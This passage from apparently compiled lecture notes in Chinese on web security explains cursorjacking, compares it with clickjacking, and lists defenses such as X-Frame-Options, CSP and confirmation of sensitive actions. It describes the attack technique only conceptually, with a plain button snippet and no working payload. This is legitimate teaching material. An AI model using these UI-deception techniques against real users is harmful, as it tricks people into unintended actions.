href="#攻击示例-1" aria-hidden="true">#</a> <strong>攻击示例</strong>：</h4><p>假设攻击者制作了一个页面，伪装成一个正常的网页，显示出一个看似可以点击的按钮，但是当用户将光标移到按钮上时，攻击者通过 JavaScript 修改了光标的位置，导致用户实际上点击了另一个完全不同的位置。</p><ul><li><p>用户看到的是：</p><div class="language-html line-numbers-mode" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span><span class="token punctuation">&gt;</span></span>点击下载<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></li><li><p>然而，攻击者通过 JavaScript 动态地改变光标的位置，使得用户在点击按钮时，实际上点击了页面上的其他地方（比如一个隐藏的链接或表单提交按钮）。</p></li></ul><h4 id="防御方法-3" tabindex="-1"><a class="header-anchor" href="#防御方法-3" aria-hidden="true">#</a> <strong>防御方法</strong>：</h4><ol><li><strong>禁止自定义光标样式</strong>：不允许网页修改光标的样式或位置，确保光标行为的自然性。</li><li><strong>验证用户操作的有效性</strong>：对于敏感操作（如提交表单、执行购买等），要求用户再次确认或使用双重验证来减少误操作。</li><li><strong>避免使用过度的 JavaScript 动态控制</strong>：减少 JavaScript 对用户界面行为（如光标控制）的干预，避免出现不必要的欺骗性用户界面。</li></ol><hr><h3 id="clickjacking-和-cursorjacking-的区别" tabindex="-1"><a class="header-anchor" href="#clickjacking-和-cursorjacking-的区别" aria-hidden="true">#</a> <strong>Clickjacking 和 Cursorjacking 的区别</strong></h3><table><thead><tr><th><strong>特征</strong></th><th><strong>Clickjacking</strong></th><th><strong>Cursorjacking</strong></th></tr></thead><tbody><tr><td><strong>攻击目标</strong></td><td>欺骗用户点击不可见或透明的内容，触发恶意操作。</td><td>欺骗用户点击与光标位置不一致的区域，触发恶意操作。</td></tr><tr><td><strong>攻击方式</strong></td><td>使用透明的 <code>&lt;iframe&gt;</code> 将页面元素叠加在一起，诱导用户点击。</td><td>通过 JavaScript 或 CSS 动态修改光标的位置或样式，误导用户。</td></tr><tr><td><strong>触发方式</strong></td><td>用户点击看似正常的按钮或链接，实际上是被 <code>&lt;iframe&gt;</code> 隐藏的内容。</td><td>用户以为他们点击的是一个正常的目标，但光标实际上被劫持。</td></tr><tr><td><strong>常见应用场景</strong></td><td>页面中的透明元素覆盖真实的可点击区域，常用于钓鱼攻击。</td><td>通过修改光标行为，使得点击看似发生在一个地方，实际上发生在另一个地方。</td></tr><tr><td><strong>防御措施</strong></td><td>设置 <code>X-Frame-Options</code> 和 <code>Content Security Policy</code>，避免页面嵌套。</td><td>禁用自定义光标样式，确保光标位置的自然性，避免动态干预。</td></tr></tbody></table><hr><h3 id="总结" tabindex="-1"><a class="header-anchor" href="#总结" aria-hidden="true">#</a> <strong>总结</strong>：</h3><ul><li><strong>Clickjacking</strong> 是通过将透明的 <code>&lt;iframe&gt;</code> 层叠到网页的正常内容上，欺骗用户点击不可见的元素来执行恶意操作，防御方法包括 <code>X-Frame-Options</code> 和 <code>CSP</code>。</li><li><strong>Cursorjacking</strong> 是通过修改用户的光标位置或样式，使得用户点击时不在他们认为的地方，防御方法包括避免自定义光标和加强对操作的验证。</li></ul><p>这两种攻击都利用了用户界面和行为的欺骗，目标都是在不知情的情况下触发一些用户本不会执行的操作。</p>`,101),r=[o];function l(i,c){return s(),n("div",null,r)}const d=a(e,[["render",l],["__file","lec15-xss.html.vue"]]);export{d as default};
